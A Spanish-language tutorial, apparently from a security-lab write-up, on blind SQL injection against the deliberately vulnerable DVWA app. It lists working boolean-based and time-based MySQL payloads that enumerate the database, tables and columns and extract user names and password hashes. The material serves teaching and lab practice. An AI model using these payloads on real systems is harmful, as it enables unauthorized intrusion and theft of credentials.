# Blind SQLi

La inyección SQL ciega (Blind SQLi) es un tipo de ataque en el que no se reciben mensajes de error claros ni información detallada del servidor, pero es posible inferir o extraer datos a través de respuestas indirectas.

- **Boolean-based Blind:** Este tipo de ataque utiliza la lógica de respuestas verdaderas o falsas (True/False) que se reflejan en el comportamiento de la página web según el resultado de la consulta SQL.
- **Time-based Blind:** Este método depende del tiempo de respuesta para inferir información cuando no hay cambios visibles en la salida de la condición True/False.

## Boolean-based Blind

En la primera prueba se presenta un campo de entrada que, al introducir un ID de usuario válido, indica si existe o no. Con esta lógica, se pueden crear consultas que devuelvan True/False para ir deduciendo la información almacenada en la base de datos.

<div style={{textAlign: 'center'}}>
    ![Uso normal](/img/attacks/SQLi/Blind/normal-use.png)
</div>

<div style={{textAlign: 'center'}}>
    ![ID no encontrado](/img/attacks/SQLi/Blind/normal-use-id-not-found.png)
</div>

Como se observa en la prueba, una condición como 1=1 devuelve True, mientras que 1=2 devuelve False.

<div style={{textAlign: 'center'}}>
    ![Condición True](/img/attacks/SQLi/Blind/attack-true.png)
</div>

<div style={{textAlign: 'center'}}>
    ![Condición False](/img/attacks/SQLi/Blind/attack-false.png)
</div>

A continuación se muestran diferentes comandos para realizar una Blind SQLi manualmente. Sin embargo, para estos casos, es recomendable utilizar herramientas como [SQLMAP](https://sqlmap.org/) por eficiencia. (No se incluyen capturas por la dificultad de lectura del código).

Para obtener la versión de MySQL, se puede utilizar:

```sql
1' AND substring(version(),1,1)=4# Version 4 False
1' AND substring(version(),1,1)=5# Version 5 True
```

Para obtener los siguientes caracteres de la versión, se incrementa la posición en el SUBSTRING:

```sql
1' AND substring(version(),2,1)="."#
1' AND substring(version(),3,1)=5#
```

Para comprobar si se pueden usar subconsultas:

```sql
1' AND (select 1)=1#
```

Para averiguar la longitud del nombre de la base de datos:

```sql
1' AND (SELECT LENGTH(database()))=1# False
1' AND (SELECT LENGTH(database()))=2# False
1' AND (SELECT LENGTH(database()))=3# False
1' AND (SELECT LENGTH(database()))=4# True
```

Para obtener el nombre de la base de datos, se puede usar la función ASCII de MySQL para comparar el valor del SUBSTRING:

```sql
1' AND (SELECT ASCII(SUBSTRING(database(), 1, 1)))>97# True
1' AND (SELECT ASCII(SUBSTRING(database(), 1, 1)))>98# True
1' AND (SELECT ASCII(SUBSTRING(database(), 1, 1)))>99# True
1' AND (SELECT ASCII(SUBSTRING(database(), 1, 1)))>100# False
```

Esto indica que la primera letra es la "d". Se repite el proceso para las siguientes posiciones.

Para conocer la cantidad de tablas en la base de datos:

```sql
1' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())=1# False
1' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())=2# True
```

Para obtener la longitud de los nombres de las tablas:

```sql
1' AND (SELECT LENGTH(table_name) FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1)=9# True
1' AND (SELECT LENGTH(table_name) FROM information_schema.tables WHERE table_schema=database() LIMIT 1,1)=5# True
```

Para obtener el nombre de la tabla, se puede usar LIKE:

```sql
1' AND (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1,1) LIKE 'u%'# True
...
1' AND (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1,1) LIKE 'users'#
```

Para obtener el número de columnas de la tabla "users":

```sql
1' AND (SELECT COUNT(column_name) FROM information_schema.columns WHERE table_schema=database() AND table_name='users')=8# True
```

Para determinar la longitud de cada columna:

```sql
1' AND (SELECT LENGTH(column_name) FROM information_schema.columns WHERE table_schema=database() AND table_name='users' LIMIT 0,1)=7# True
```

Para obtener los nombres de las columnas:

```sql
1' AND (SELECT column_name FROM information_schema.columns WHERE table_schema=database() AND table_name='users' LIMIT 3,1) LIKE 'user%'# True
```

Para extraer los datos, se repite el proceso:

- dvwa
  - guestbook
  - users
    - user
    - password

Para obtener el total de usuarios:

```sql
1' AND (SELECT count(user) FROM users)=5# True
```

Para obtener el tamaño del primer usuario:

```sql
1' AND (SELECT LENGTH(user) FROM users LIMIT 1)=5# True
```

Para obtener el tamaño del password del primer usuario:

```sql
1' AND (SELECT LENGTH(password) FROM users LIMIT 1)=32# True
```

Para obtener los datos de los campos:

```sql
1' AND (SELECT user FROM users LIMIT 1) LIKE 'admin%'# True
1' AND (SELECT password FROM users LIMIT 1) LIKE '5f4dcc3b5aa765d61d8327deb882cf99%'# True
```

## Time-based Blind

En algunos casos, se puede utilizar una técnica basada en el tiempo para inferir información. Por ejemplo, utilizando la función BENCHMARK para provocar un retardo si la condición es verdadera.

Obtener la versión de la base de datos:

```sql
1' UNION SELECT IF(SUBSTRING(version(),1,1)=5,BENCHMARK(5000000,MD5(CHAR(1))),null),null# True
```

Tamaño del nombre de la base de datos:

```sql
1' UNION SELECT IF(((SELECT LENGTH(database()))=4),BENCHMARK(5000000,MD5(CHAR(1))),null),null# True
```

Este proceso puede ser largo y costoso, por lo que se recomienda el uso de herramientas como SQLMAP cuando sea posible.

## Medio-Alto

Los ejercicios de nivel medio y alto pueden resolverse con SQLMAP de la misma forma que los anteriores, o manualmente siguiendo el proceso descrito. Sin embargo, el tiempo requerido para completar estos ataques de forma manual puede ser considerablemente largo. Por ello, la utilización de herramientas automatizadas como SQLMAP suele ser una opción más eficiente y efectiva en estos casos.
